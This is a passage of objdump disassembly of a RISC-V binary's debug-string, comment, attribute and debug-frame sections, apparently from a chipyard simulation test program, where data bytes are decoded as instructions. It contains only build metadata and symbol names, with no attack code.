 660:	7300                	ld	s0,32(a4)
 662:	6372                	ld	t1,280(sp)
 664:	6174732f          	0x6174732f
 668:	532e6b63          	bltu	t3,s2,b9e <_tbss_end+0xb1a>
 66c:	6e00                	ld	s0,24(a2)
 66e:	6d61                	lui	s10,0x18
 670:	0065                	c.nop	25
 672:	745f 736c 645f      	0x645f736c745f
 678:	7461                	lui	s0,0xffff8
 67a:	0061                	c.nop	24
 67c:	6c727473          	csrrci	s0,0x6c7,4
 680:	6e65                	lui	t3,0x19
 682:	7000                	ld	s0,32(s0)
 684:	6972                	ld	s2,280(sp)
 686:	746e                	ld	s0,248(sp)
 688:	7241                	lui	tp,0xffff0
 68a:	6172                	ld	sp,280(sp)
 68c:	0079                	c.nop	30
 68e:	73756163          	bltu	a0,s7,db0 <_tbss_end+0xd2c>
 692:	0065                	c.nop	25
 694:	6e727473          	csrrci	s0,0x6e7,4
 698:	656c                	ld	a1,200(a0)
 69a:	006e                	c.slli	zero,0x1b
 69c:	7270                	ld	a2,224(a2)
 69e:	7365636f          	jal	t1,56dd4 <_tbss_end+0x56d50>
 6a2:	72705f73          	csrrwi	t5,0x727,0
 6a6:	6365                	lui	t1,0x19
 6a8:	7369                	lui	t1,0xffffa
 6aa:	6f69                	lui	t5,0x1a
 6ac:	006e                	c.slli	zero,0x1b
 6ae:	6474                	ld	a3,200(s0)
 6b0:	7461                	lui	s0,0xffff8
 6b2:	5f61                	li	t5,-8
 6b4:	657a6973          	csrrsi	s2,0x657,20
 6b8:	5f00                	lw	s0,56(a4)
 6ba:	6474                	ld	a3,200(s0)
 6bc:	7461                	lui	s0,0xffff8
 6be:	5f61                	li	t5,-8
 6c0:	6e65                	lui	t3,0x19
 6c2:	0064                	addi	s1,sp,12
 6c4:	75746567          	0x75746567
 6c8:	6e69                	lui	t3,0x1a
 6ca:	0074                	addi	a3,sp,12
 6cc:	7570                	ld	a2,232(a0)
 6ce:	6374                	ld	a3,192(a4)
 6d0:	6168                	ld	a0,192(a0)
 6d2:	0072                	c.slli	zero,0x1c
 6d4:	6572                	ld	a0,280(sp)
 6d6:	70007367          	0x70007367
 6da:	6972                	ld	s2,280(sp)
 6dc:	746e                	ld	s0,248(sp)
 6de:	00727473          	csrrci	s0,0x7,4
 6e2:	6162                	ld	sp,24(sp)
 6e4:	7272                	ld	tp,312(sp)
 6e6:	6569                	lui	a0,0x1a
 6e8:	0072                	c.slli	zero,0x1c
 6ea:	6168                	ld	a0,192(a0)
 6ec:	646e                	ld	s0,216(sp)
 6ee:	656c                	ld	a1,200(a0)
 6f0:	745f 6172 0070      	0x706172745f
 6f6:	6874                	ld	a3,208(s0)
 6f8:	6572                	ld	a0,280(sp)
 6fa:	6461                	lui	s0,0x18
 6fc:	655f 746e 7972      	0x7972746e655f
 702:	7300                	ld	s0,32(a4)
 704:	7274                	ld	a3,224(a2)
 706:	00797063          	bleu	t2,s2,706 <_tbss_end+0x682>
 70a:	7270                	ld	a2,224(a2)
 70c:	6e69                	lui	t3,0x1a
 70e:	6e74                	ld	a3,216(a2)
 710:	6d75                	lui	s10,0x1d
 712:	6500                	ld	s0,8(a0)
 714:	616e                	ld	sp,216(sp)
 716:	6c62                	ld	s8,24(sp)
 718:	0065                	c.nop	25
 71a:	6261                	lui	tp,0x18
 71c:	0074726f          	jal	tp,47f22 <_tbss_end+0x47e9e>
 720:	5f5f 6e67 6375      	0x63756e675f5f
 726:	765f 5f61 696c      	0x696c5f61765f
 72c:	70007473          	csrrci	s0,0x700,0
 730:	6461                	lui	s0,0x18
 732:	72730063          	beq	t1,t2,e52 <_tbss_end+0xdce>
 736:	79732f63          	0x79732f63
 73a:	6c616373          	csrrsi	t1,0x6c6,2
 73e:	736c                	ld	a1,224(a4)
 740:	632e                	ld	t1,200(sp)
 742:	7700                	ld	s0,40(a4)
 744:	6469                	lui	s0,0x1a
 746:	6874                	ld	a3,208(s0)
 748:	7300                	ld	s0,32(a4)
 74a:	7274                	ld	a3,224(a2)
 74c:	0030                	addi	a2,sp,8
 74e:	6e756f63          	bltu	a0,t2,e4c <_tbss_end+0xdc8>
 752:	6574                	ld	a3,200(a0)
 754:	7372                	ld	t1,312(sp)
 756:	6300                	ld	s0,0(a4)
 758:	0065646f          	jal	s0,5675e <_tbss_end+0x566da>
 75c:	666c                	ld	a1,200(a2)
 75e:	2f007273          	csrrci	tp,0x2f0,0
 762:	6f68                	ld	a0,216(a4)
 764:	656d                	lui	a0,0x1b
 766:	6568632f          	0x6568632f
 76a:	676e                	ld	a4,216(sp)
 76c:	6978                	ld	a4,208(a0)
 76e:	6f61                	lui	t5,0x18
 770:	7579                	lui	a0,0xffffe
 772:	6968632f          	0x6968632f
 776:	7970                	ld	a2,240(a0)
 778:	7261                	lui	tp,0xffff8
 77a:	2f64                	fld	fs1,216(a4)
 77c:	736d6973          	csrrsi	s2,0x736,26
 780:	7474612f          	0x7474612f
 784:	6361                	lui	t1,0x18
 786:	6c00316b          	0x6c00316b
 78a:	7361                	lui	t1,0xffff8
 78c:	5f74                	lw	a3,124(a4)
 78e:	6d66                	ld	s10,88(sp)
 790:	0074                	addi	a3,sp,12
 792:	7562                	ld	a0,56(sp)
 794:	6c66                	ld	s8,88(sp)
 796:	6e65                	lui	t3,0x19
 798:	7200                	ld	s0,32(a2)
 79a:	7365                	lui	t1,0xffff9
 79c:	63746977          	0x63746977
 7a0:	0068                	addi	a0,sp,12
 7a2:	63727473          	csrrci	s0,0x637,4
 7a6:	706d                	c.lui	zero,0xffffb
 7a8:	7000                	ld	s0,32(s0)
 7aa:	6972                	ld	s2,280(sp)
 7ac:	746e                	ld	s0,248(sp)
 7ae:	6f44                	ld	s1,152(a4)
 7b0:	6275                	lui	tp,0x1d
 7b2:	656c                	ld	a1,200(a0)
 7b4:	7241                	lui	tp,0xffff0
 7b6:	6172                	ld	sp,280(sp)
 7b8:	0079                	c.nop	30
 7ba:	666c                	ld	a1,200(a2)
 7bc:	616c                	ld	a1,192(a0)
 7be:	73700067          	jr	1847(zero) # 737 <_tbss_end+0x6b3>
 7c2:	7274                	ld	a3,224(a2)
 7c4:	6d00                	ld	s0,24(a0)
 7c6:	6d65                	lui	s10,0x19
 7c8:	00746573          	csrrsi	a0,0x7,8
 7cc:	7261                	lui	tp,0xffff8
 7ce:	61003067          	0x61003067
 7d2:	6772                	ld	a4,280(sp)
 7d4:	0031                	c.nop	12
 7d6:	7261                	lui	tp,0xffff8
 7d8:	5f003267          	0x5f003267
 7dc:	6e69                	lui	t3,0x1a
 7de:	7469                	lui	s0,0xffffa
 7e0:	7300                	ld	s0,32(a4)
 7e2:	7379                	lui	t1,0xffffe
 7e4:	6c6c6163          	bltu	s8,t1,ea6 <_tbss_end+0xe22>
 7e8:	7600                	ld	s0,40(a2)
 7ea:	7265                	lui	tp,0xffff9
 7ec:	6669                	lui	a2,0x1a
 7ee:	4479                	li	s0,30
 7f0:	6c62756f          	jal	a0,27eb6 <_tbss_end+0x27e32>
 7f4:	0065                	c.nop	25
 7f6:	69746567          	0x69746567
 7fa:	746e                	ld	s0,248(sp)
 7fc:	7500                	ld	s0,40(a0)
 7fe:	736e                	ld	t1,248(sp)
 800:	6769                	lui	a4,0x1a
 802:	656e                	ld	a0,216(sp)
 804:	5f64                	lw	s1,124(a4)
 806:	756e                	ld	a0,248(sp)
 808:	626d                	lui	tp,0x1b
 80a:	7265                	lui	tp,0xffff9
 80c:	7000                	ld	s0,32(s0)
 80e:	7475                	lui	s0,0xffffd
 810:	6164                	ld	s1,192(a0)
 812:	0074                	addi	a3,sp,12
 814:	7261                	lui	tp,0xffff8
 816:	77006367          	0x77006367
 81a:	6968                	ld	a0,208(a0)
 81c:	61006863          	bltu	zero,a6,e2c <_tbss_end+0xda8>
 820:	6772                	ld	a4,280(sp)
 822:	0076                	c.slli	zero,0x1d
 824:	69727073          	csrci	0x697,4
 828:	746e                	ld	s0,248(sp)
 82a:	0066                	c.slli	zero,0x19
 82c:	745f 6164 6174      	0x61746164745f
 832:	625f 6765 6e69      	0x6e696765625f
 838:	6e00                	ld	s0,24(a2)
 83a:	65726f63          	bltu	tp,s7,e98 <_tbss_end+0xe14>
 83e:	5f5f0073          	0x5f5f0073
 842:	6975                	lui	s2,0x1d
 844:	746e                	ld	s0,248(sp)
 846:	7470                	ld	a2,232(s0)
 848:	5f72                	lw	t5,60(sp)
 84a:	0074                	addi	a3,sp,12
 84c:	6c61                	lui	s8,0x18
 84e:	6674                	ld	a3,200(a2)
 850:	616c                	ld	a1,192(a0)
 852:	62740067          	jr	1575(s0) # ffffffffffffd627 <_end+0xffffffff7ffe2167>
 856:	735f7373          	csrrci	t1,0x735,30
 85a:	7a69                	lui	s4,0xffffa
 85c:	0065                	c.nop	25
 85e:	6874                	ld	a3,208(s0)
 860:	6572                	ld	a0,280(sp)
 862:	6461                	lui	s0,0x18
 864:	705f 696f 746e      	0x746e696f705f
 86a:	7265                	lui	tp,0xffff9
 86c:	6300                	ld	s0,0(a4)
 86e:	746e756f          	jal	a0,e7fb4 <_tbss_end+0xe7f30>
 872:	7265                	lui	tp,0xffff9
 874:	6e5f 6d61 7365      	0x73656d616e5f
 87a:	7700                	ld	s0,40(a4)
 87c:	0064726f          	jal	tp,47882 <_tbss_end+0x477fe>
 880:	745f 7362 5f73      	0x5f737362745f
 886:	6e65                	lui	t3,0x19
 888:	0064                	addi	s1,sp,12
 88a:	20554e47          	fmsub.s	ft8,fa0,ft5,ft4,rmm
 88e:	20373143          	fmadd.s	ft2,fa4,ft3,ft4,rup
 892:	2e39                	addiw	t3,t3,14
 894:	2e32                	fld	ft8,264(sp)
 896:	2030                	fld	fa2,64(s0)
 898:	6d2d                	lui	s10,0xb
 89a:	646f6d63          	bltu	t5,t1,ef4 <_tbss_end+0xe70>
 89e:	6c65                	lui	s8,0x19
 8a0:	6d3d                	lui	s10,0xf
 8a2:	6465                	lui	s0,0x19
 8a4:	6e61                	lui	t3,0x18
 8a6:	2079                	0x2079
 8a8:	6d2d                	lui	s10,0xb
 8aa:	7574                	ld	a3,232(a0)
 8ac:	656e                	ld	a0,216(sp)
 8ae:	723d                	lui	tp,0xfffef
 8b0:	656b636f          	jal	t1,b6f06 <_tbss_end+0xb6e82>
 8b4:	2074                	fld	fa3,192(s0)
 8b6:	6d2d                	lui	s10,0xb
 8b8:	7261                	lui	tp,0xffff8
 8ba:	723d6863          	bltu	s10,gp,fea <_tbss_end+0xf66>
 8be:	3676                	fld	fa2,376(sp)
 8c0:	6934                	ld	a3,80(a0)
 8c2:	616d                	addi	sp,sp,240
 8c4:	6466                	ld	s0,88(sp)
 8c6:	6d2d2063          	0x6d2d2063
 8ca:	6261                	lui	tp,0x18
 8cc:	3d69                	addiw	s10,s10,-6
 8ce:	706c                	ld	a1,224(s0)
 8d0:	3436                	fld	fs0,360(sp)
 8d2:	2064                	fld	fs1,192(s0)
 8d4:	672d                	lui	a4,0xb
 8d6:	2d20                	fld	fs0,88(a0)
 8d8:	2d20304f          	0x2d20304f
 8dc:	6e66                	ld	t3,88(sp)
 8de:	6f632d6f          	jal	s10,32fd4 <_tbss_end+0x32f50>
 8e2:	6d6d                	lui	s10,0x1b
 8e4:	2d206e6f          	jal	t3,6bb6 <_tbss_end+0x6b32>
 8e8:	6e66                	ld	t3,88(sp)
 8ea:	75622d6f          	jal	s10,23040 <_tbss_end+0x22fbc>
 8ee:	6c69                	lui	s8,0x1a
 8f0:	6974                	ld	a3,208(a0)
 8f2:	2d6e                	fld	fs10,216(sp)
 8f4:	7270                	ld	a2,224(a2)
 8f6:	6e69                	lui	t3,0x1a
 8f8:	6674                	ld	a3,200(a2)
 8fa:	7400                	ld	s0,40(s0)
 8fc:	736f686f          	jal	a6,f7032 <_tbss_end+0xf6fae>
 900:	0074                	addi	a3,sp,12
 902:	6964                	ld	s1,208(a0)
 904:	73007367          	0x73007367
 908:	7270                	ld	a2,224(a2)
 90a:	6e69                	lui	t3,0x1a
 90c:	6674                	ld	a3,200(a2)
 90e:	705f 7475 6863      	0x68637475705f
 914:	6200                	ld	s0,0(a2)
 916:	7479                	lui	s0,0xffffe
 918:	0065                	c.nop	25
 91a:	7270                	ld	a2,224(a2)
 91c:	6e69                	lui	t3,0x1a
 91e:	6874                	ld	a3,208(s0)
 920:	7865                	lui	a6,0xffff9
 922:	7400                	ld	s0,40(s0)
 924:	7268                	ld	a0,224(a2)
 926:	6165                	addi	sp,sp,112
 928:	7364                	ld	s1,224(a4)
 92a:	6e65                	lui	t3,0x19
 92c:	74006573          	csrrsi	a0,0x740,0
 930:	7365                	lui	t1,0xffff9
 932:	0074                	addi	a3,sp,12
 934:	6270                	ld	a2,192(a2)
 936:	6675                	lui	a2,0x1d
 938:	6d00                	ld	s0,24(a0)
 93a:	6761                	lui	a4,0x18
 93c:	6369                	lui	t1,0x1a
 93e:	6d5f 6d65 7400      	0x74006d656d5f
 944:	736f686f          	jal	a6,f707a <_tbss_end+0xf6ff6>
 948:	5f74                	lw	a3,124(a4)
 94a:	7865                	lui	a6,0xffff9
 94c:	7469                	lui	s0,0xffffa
 94e:	6600                	ld	s0,8(a2)
 950:	6f72                	ld	t5,280(sp)
 952:	686d                	lui	a6,0x1b
 954:	0074736f          	jal	t1,4815a <_tbss_end+0x480d6>
 958:	656d                	lui	a0,0x1b
 95a:	636d                	lui	t1,0x1b
 95c:	7970                	ld	a2,240(a0)
 95e:	5f00                	lw	s0,56(a4)
 960:	625f 6975 746c      	0x746c6975625f
 966:	6e69                	lui	t3,0x1a
 968:	765f 5f61 696c      	0x696c5f61765f
 96e:	61007473          	csrrci	s0,0x610,0
 972:	6f74                	ld	a3,216(a4)
 974:	006c                	addi	a1,sp,12
 976:	53746573          	csrrsi	a0,0x537,8
 97a:	6174                	ld	a3,192(a0)
 97c:	7374                	ld	a3,224(a4)
 97e:	6900                	ld	s0,16(a0)
 980:	696e                	ld	s2,216(sp)
 982:	5f74                	lw	a3,124(a4)
 984:	6c74                	ld	a3,216(s0)
 986:	65760073          	0x65760073
 98a:	6972                	ld	s2,280(sp)
 98c:	7966                	ld	s2,120(sp)
 98e:	6400                	ld	s0,8(s0)
 990:	7365                	lui	t1,0xffff9
 992:	0074                	addi	a3,sp,12
 994:	7076                	0x7076
 996:	6972                	ld	s2,280(sp)
 998:	746e                	ld	s0,248(sp)
 99a:	6d66                	ld	s10,88(sp)
 99c:	0074                	addi	a3,sp,12

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	3a434347          	fmsub.d	ft6,ft6,ft4,ft7,rmm
   4:	2820                	fld	fs0,80(s0)
   6:	29554e47          	fmsub.s	ft8,fa0,fs5,ft5,rmm
   a:	3720                	fld	fs0,104(a4)
   c:	322e                	fld	ft4,232(sp)
   e:	302e                	fld	ft0,232(sp)
  10:	4700                	lw	s0,8(a4)
  12:	203a4343          	fmadd.s	ft6,fs4,ft3,ft4,rmm
  16:	4728                	lw	a0,72(a4)
  18:	554e                	lw	a0,240(sp)
  1a:	2029                	0x2029
  1c:	2e39                	addiw	t3,t3,14
  1e:	2e32                	fld	ft8,264(sp)
  20:	0030                	addi	a2,sp,8

Disassembly of section .riscv.attributes:

0000000000000000 <.riscv.attributes>:
   0:	3441                	addiw	s0,s0,-16
   2:	0000                	unimp
   4:	7200                	ld	s0,32(a2)
   6:	7369                	lui	t1,0xffffa
   8:	01007663          	bleu	a6,zero,14 <_tdata_begin+0x14>
   c:	002a                	c.slli	zero,0xa
   e:	0000                	unimp
  10:	1004                	addi	s1,sp,32
  12:	7205                	lui	tp,0xfffe1
  14:	3676                	fld	fa2,376(sp)
  16:	6934                	ld	a3,80(a0)
  18:	7032                	0x7032
  1a:	5f30                	lw	a2,120(a4)
  1c:	326d                	addiw	tp,tp,-5
  1e:	3070                	fld	fa2,224(s0)
  20:	615f 7032 5f30      	0x5f307032615f
  26:	3266                	fld	ft4,120(sp)
  28:	3070                	fld	fa2,224(s0)
  2a:	645f 7032 5f30      	0x5f307032645f
  30:	30703263          	0x30703263
	...

Disassembly of section .debug_frame:

0000000000000000 <.debug_frame>:
   0:	000c                	0xc
   2:	0000                	unimp
   4:	ffff                	0xffff
   6:	ffff                	0xffff
   8:	0001                	nop
   a:	7c01                	lui	s8,0xfffe0
   c:	0d01                	addi	s10,s10,0
   e:	0002                	c.slli	zero,0x0
  10:	0024                	addi	s1,sp,8
  12:	0000                	unimp
  14:	0000                	unimp
  16:	0000                	unimp
  18:	1048                	addi	a0,sp,36
  1a:	8000                	0x8000
  1c:	0000                	unimp
  1e:	0000                	unimp
  20:	00ce                	slli	ra,ra,0x13
  22:	0000                	unimp
  24:	0000                	unimp
  26:	0000                	unimp
  28:	0e42                	slli	t3,t3,0x10
  2a:	4260                	lw	s0,68(a2)
  2c:	0288                	addi	a0,sp,320
  2e:	0c42                	slli	s8,s8,0x10
  30:	0008                	0x8
  32:	c402                	sw	zero,8(sp)
  34:	42c8                	lw	a0,4(a3)
  36:	020d                	addi	tp,tp,3
  38:	0024                	addi	s1,sp,8
  3a:	0000                	unimp
  3c:	0000                	unimp
  3e:	0000                	unimp
  40:	1116                	slli	sp,sp,0x25
  42:	8000                	0x8000
  44:	0000                	unimp
  46:	0000                	unimp
  48:	00ec                	addi	a1,sp,76
  4a:	0000                	unimp
  4c:	0000                	unimp
  4e:	0000                	unimp
  50:	0e42                	slli	t3,t3,0x10
  52:	4240                	lw	s0,4(a2)
  54:	0288                	addi	a0,sp,320
  56:	0c42                	slli	s8,s8,0x10
  58:	0008                	0x8
  5a:	e202                	sd	zero,256(sp)
  5c:	42c8                	lw	a0,4(a3)
  5e:	020d                	addi	tp,tp,3
  60:	0024                	addi	s1,sp,8
  62:	0000                	unimp
  64:	0000                	unimp
  66:	0000                	unimp
  68:	1202                	slli	tp,tp,0x20
  6a:	8000                	0x8000
  6c:	0000                	unimp
  6e:	0000                	unimp
  70:	0010                	0x10
  72:	0000                	unimp
  74:	0000                	unimp
  76:	0000                	unimp
  78:	0e42                	slli	t3,t3,0x10
  7a:	4210                	lw	a2,0(a2)
  7c:	0288                	addi	a0,sp,320
  7e:	0c42                	slli	s8,s8,0x10
  80:	0008                	0x8
  82:	c846                	sw	a7,16(sp)
  84:	0d42                	slli	s10,s10,0x10
  86:	0002                	c.slli	zero,0x0
  88:	0024                	addi	s1,sp,8
  8a:	0000                	unimp
  8c:	0000                	unimp
  8e:	0000                	unimp
  90:	1212                	slli	tp,tp,0x24
  92:	8000                	0x8000
  94:	0000                	unimp
  96:	0000                	unimp
  98:	003e                	c.slli	zero,0xf
  9a:	0000                	unimp
  9c:	0000                	unimp
  9e:	0000                	unimp
  a0:	0e42                	slli	t3,t3,0x10
  a2:	4230                	lw	a2,64(a2)
  a4:	0288                	addi	a0,sp,320
  a6:	0c42                	slli	s8,s8,0x10
  a8:	0008                	0x8
  aa:	c874                	sw	a3,84(s0)
  ac:	0d42                	slli	s10,s10,0x10
  ae:	0002                	c.slli	zero,0x0
  b0:	002c                	addi	a1,sp,8
  b2:	0000                	unimp
  b4:	0000                	unimp
  b6:	0000                	unimp
  b8:	1250                	addi	a2,sp,292
  ba:	8000                	0x8000
  bc:	0000                	unimp
  be:	0000                	unimp
  c0:	039a                	slli	t2,t2,0x6
  c2:	0000                	unimp
  c4:	0000                	unimp
  c6:	0000                	unimp
  c8:	0e42                	slli	t3,t3,0x10
  ca:	01c0                	addi	s0,sp,196
  cc:	8144                	0x8144
  ce:	8802                	jr	a6
  d0:	4204                	lw	s1,0(a2)
  d2:	080c                	addi	a1,sp,16
  d4:	0300                	addi	s0,sp,384
  d6:	038c                	addi	a1,sp,448
  d8:	42c1                	li	t0,16
  da:	42c8                	lw	a0,4(a3)
  dc:	020d                	addi	tp,tp,3
  de:	0000                	unimp
  e0:	000c                	0xc
  e2:	0000                	unimp
  e4:	ffff                	0xffff
  e6:	ffff                	0xffff
  e8:	0001                	nop
  ea:	7c01                	lui	s8,0xfffe0
  ec:	0d01                	addi	s10,s10,0
  ee:	0002                	c.slli	zero,0x0
  f0:	002c                	addi	a1,sp,8
  f2:	0000                	unimp
  f4:	00e0                	addi	s0,sp,76
  f6:	0000                	unimp
  f8:	1618                	addi	a4,sp,800
  fa:	8000                	0x8000
  fc:	0000                	unimp
  fe:	0000                	unimp
 100:	001c                	0x1c
 102:	0000                	unimp
 104:	0000                	unimp
 106:	0000                	unimp
 108:	0e42                	slli	t3,t3,0x10
 10a:	4230                	lw	a2,64(a2)
 10c:	0288                	addi	a0,sp,320
 10e:	0c42                	slli	s8,s8,0x10
 110:	0008                	0x8
 112:	c852                	sw	s4,16(sp)
 114:	020c                	addi	a1,sp,256
 116:	4230                	lw	a2,64(a2)
 118:	000e                	c.slli	zero,0x3
 11a:	0000                	unimp
 11c:	0000                	unimp
 11e:	0000                	unimp
 120:	002c                	addi	a1,sp,8
 122:	0000                	unimp
 124:	00e0                	addi	s0,sp,76
 126:	0000                	unimp
 128:	1634                	addi	a3,sp,808
 12a:	8000                	0x8000
 12c:	0000                	unimp
 12e:	0000                	unimp
 130:	001c                	0x1c
 132:	0000                	unimp
 134:	0000                	unimp
 136:	0000                	unimp
 138:	0e42                	slli	t3,t3,0x10
 13a:	4230                	lw	a2,64(a2)
 13c:	0288                	addi	a0,sp,320
 13e:	0c42                	slli	s8,s8,0x10
 140:	0008                	0x8
 142:	c852                	sw	s4,16(sp)
 144:	020c                	addi	a1,sp,256
 146:	4230                	lw	a2,64(a2)
 148:	000e                	c.slli	zero,0x3
 14a:	0000                	unimp
 14c:	0000                	unimp
 14e:	0000                	unimp
 150:	002c                	addi	a1,sp,8
 152:	0000                	unimp
 154:	00e0                	addi	s0,sp,76
 156:	0000                	unimp
 158:	1650                	addi	a2,sp,804
 15a:	8000                	0x8000
 15c:	0000                	unimp
 15e:	0000                	unimp
 160:	010a                	slli	sp,sp,0x2
 162:	0000                	unimp
 164:	0000                	unimp
 166:	0000                	unimp
 168:	0e42                	slli	t3,t3,0x10
 16a:	4250                	lw	a2,4(a2)
 16c:	0288                	addi	a0,sp,320
 16e:	0c42                	slli	s8,s8,0x10
 170:	0008                	0x8
 172:	c8010003          	lb	zero,-896(sp)
 176:	020c                	addi	a1,sp,256
 178:	4250                	lw	a2,4(a2)
 17a:	000e                	c.slli	zero,0x3
 17c:	0000                	unimp
 17e:	0000                	unimp
 180:	002c                	addi	a1,sp,8
 182:	0000                	unimp
 184:	00e0                	addi	s0,sp,76
 186:	0000                	unimp
 188:	175a                	slli	a4,a4,0x36
 18a:	8000                	0x8000
 18c:	0000                	unimp
 18e:	0000                	unimp
 190:	0122                	slli	sp,sp,0x8
 192:	0000                	unimp
 194:	0000                	unimp
 196:	0000                	unimp
 198:	0e42                	slli	t3,t3,0x10
 19a:	4260                	lw	s0,68(a2)
 19c:	0288                	addi	a0,sp,320
 19e:	0c42                	slli	s8,s8,0x10
 1a0:	0008                	0x8
 1a2:	c8011803          	lh	a6,-896(sp)
 1a6:	020c                	addi	a1,sp,256
 1a8:	4260                	lw	s0,68(a2)
 1aa:	000e                	c.slli	zero,0x3
 1ac:	0000                	unimp
 1ae:	0000                	unimp
 1b0:	002c                	addi	a1,sp,8
 1b2:	0000                	unimp
 1b4:	00e0                	addi	s0,sp,76
 1b6:	0000                	unimp
 1b8:	187c                	addi	a5,sp,60
 1ba:	8000                	0x8000
 1bc:	0000                	unimp
 1be:	0000                	unimp
 1c0:	008a                	slli	ra,ra,0x2
 1c2:	0000                	unimp
 1c4:	0000                	unimp
 1c6:	0000                	unimp
 1c8:	0e42                	slli	t3,t3,0x10
 1ca:	4220                	lw	s0,64(a2)
 1cc:	0288                	addi	a0,sp,320
 1ce:	0c42                	slli	s8,s8,0x10
 1d0:	0008                	0x8
 1d2:	8002                	0x8002
 1d4:	0cc8                	addi	a0,sp,596
 1d6:	2002                	fld	ft0,0(sp)
 1d8:	0e42                	slli	t3,t3,0x10
 1da:	0000                	unimp
 1dc:	0000                	unimp
 1de:	0000                	unimp
 1e0:	002c                	addi	a1,sp,8
 1e2:	0000                	unimp
 1e4:	00e0                	addi	s0,sp,76
 1e6:	0000                	unimp
 1e8:	1906                	slli	s2,s2,0x21
 1ea:	8000                	0x8000
 1ec:	0000                	unimp
 1ee:	0000                	unimp
 1f0:	0036                	c.slli	zero,0xd
 1f2:	0000                	unimp
 1f4:	0000                	unimp
 1f6:	0000                	unimp
 1f8:	0e42                	slli	t3,t3,0x10
 1fa:	4230                	lw	a2,64(a2)
 1fc:	0288                	addi	a0,sp,320
 1fe:	0c42                	slli	s8,s8,0x10
 200:	0008                	0x8
 202:	c86c                	sw	a1,84(s0)
 204:	020c                	addi	a1,sp,256
 206:	4230                	lw	a2,64(a2)
 208:	000e                	c.slli	zero,0x3
 20a:	0000                	unimp
 20c:	0000                	unimp
 20e:	0000                	unimp
 210:	002c                	addi	a1,sp,8
 212:	0000                	unimp
 214:	00e0                	addi	s0,sp,76
 216:	0000                	unimp
 218:	193c                	addi	a5,sp,184
 21a:	8000                	0x8000
 21c:	0000                	unimp
 21e:	0000                	unimp
 220:	007e                	c.slli	zero,0x1f
 222:	0000                	unimp
 224:	0000                	unimp
 226:	0000                	unimp
 228:	0e42                	slli	t3,t3,0x10
 22a:	01b0                	addi	a2,sp,200
 22c:	8842                	mv	a6,a6
 22e:	4202                	lw	tp,0(sp)
 230:	080c                	addi	a1,sp,16
 232:	0200                	addi	s0,sp,256
 234:	c874                	sw	a3,84(s0)
 236:	020c                	addi	a1,sp,256
 238:	01b0                	addi	a2,sp,200
 23a:	0e42                	slli	t3,t3,0x10
 23c:	0000                	unimp
 23e:	0000                	unimp
 240:	002c                	addi	a1,sp,8
 242:	0000                	unimp
 244:	00e0                	addi	s0,sp,76
 246:	0000                	unimp
 248:	19ba                	slli	s3,s3,0x2e
 24a:	8000                	0x8000
 24c:	0000                	unimp
 24e:	0000                	unimp
 250:	0110                	addi	a2,sp,128
 252:	0000                	unimp
 254:	0000                	unimp
 256:	0000                	unimp
 258:	0e42                	slli	t3,t3,0x10
 25a:	4250                	lw	a2,4(a2)
 25c:	0288                	addi	a0,sp,320
 25e:	0c42                	slli	s8,s8,0x10
 260:	0008                	0x8
 262:	c8010603          	lb	a2,-896(sp)
 266:	020c                	addi	a1,sp,256
 268:	4250                	lw	a2,4(a2)
 26a:	000e                	c.slli	zero,0x3
 26c:	0000                	unimp
 26e:	0000                	unimp
 270:	0024                	addi	s1,sp,8
 272:	0000                	unimp
 274:	00e0                	addi	s0,sp,76
 276:	0000                	unimp
 278:	1aca                	slli	s5,s5,0x32
 27a:	8000                	0x8000
 27c:	0000                	unimp
 27e:	0000                	unimp
 280:	0020                	addi	s0,sp,8
 282:	0000                	unimp
 284:	0000                	unimp
 286:	0000                	unimp
 288:	0e42                	slli	t3,t3,0x10
 28a:	4220                	lw	s0,64(a2)
 28c:	0288                	addi	a0,sp,320
 28e:	0c42                	slli	s8,s8,0x10
 290:	0008                	0x8
 292:	0000                	unimp
 294:	0000                	unimp
 296:	0000                	unimp
 298:	0024                	addi	s1,sp,8
 29a:	0000                	unimp
 29c:	00e0                	addi	s0,sp,76
 29e:	0000                	unimp
 2a0:	1aea                	slli	s5,s5,0x3a
 2a2:	8000                	0x8000
 2a4:	0000                	unimp
 2a6:	0000                	unimp
 2a8:	001c                	0x1c
 2aa:	0000                	unimp
 2ac:	0000                	unimp
 2ae:	0000                	unimp
 2b0:	0e42                	slli	t3,t3,0x10
 2b2:	4430                	lw	a2,72(s0)
 2b4:	0281                	addi	t0,t0,0
 2b6:	0488                	addi	a0,sp,576
 2b8:	0c42                	slli	s8,s8,0x10
 2ba:	0008                	0x8
 2bc:	0000                	unimp
 2be:	0000                	unimp
 2c0:	0024                	addi	s1,sp,8
 2c2:	0000                	unimp
 2c4:	00e0                	addi	s0,sp,76
 2c6:	0000                	unimp
 2c8:	1b06                	slli	s6,s6,0x21
 2ca:	8000                	0x8000
 2cc:	0000                	unimp
 2ce:	0000                	unimp
 2d0:	0018                	0x18
 2d2:	0000                	unimp
 2d4:	0000                	unimp
 2d6:	0000                	unimp
 2d8:	0e42                	slli	t3,t3,0x10
 2da:	4420                	lw	s0,72(s0)
 2dc:	0281                	addi	t0,t0,0
 2de:	0488                	addi	a0,sp,576
 2e0:	0c42                	slli	s8,s8,0x10
 2e2:	0008                	0x8
 2e4:	0000                	unimp
 2e6:	0000                	unimp
 2e8:	0024                	addi	s1,sp,8
 2ea:	0000                	unimp
 2ec:	00e0                	addi	s0,sp,76
 2ee:	0000                	unimp
 2f0:	1b1e                	slli	s6,s6,0x27
 2f2:	8000                	0x8000
 2f4:	0000                	unimp
 2f6:	0000                	unimp
 2f8:	0010                	0x10
 2fa:	0000                	unimp
 2fc:	0000                	unimp
 2fe:	0000                	unimp
 300:	0e42                	slli	t3,t3,0x10
 302:	4410                	lw	a2,8(s0)
 304:	0281                	addi	t0,t0,0
 306:	0488                	addi	a0,sp,576
 308:	0c42                	slli	s8,s8,0x10
 30a:	0008                	0x8
 30c:	0000                	unimp
 30e:	0000                	unimp
 310:	0034                	addi	a3,sp,8
 312:	0000                	unimp
 314:	00e0                	addi	s0,sp,76
 316:	0000                	unimp
 318:	1b2e                	slli	s6,s6,0x2b
 31a:	8000                	0x8000
 31c:	0000                	unimp
 31e:	0000                	unimp
 320:	0036                	c.slli	zero,0xd
 322:	0000                	unimp
 324:	0000                	unimp
 326:	0000                	unimp
 328:	0e42                	slli	t3,t3,0x10
 32a:	4630                	lw	a2,72(a2)
 32c:	0281                	addi	t0,t0,0
 32e:	0488                	addi	a0,sp,576
 330:	0689                	addi	a3,a3,2
 332:	0c42                	slli	s8,s8,0x10
 334:	0008                	0x8
 336:	c164                	sw	s1,68(a0)
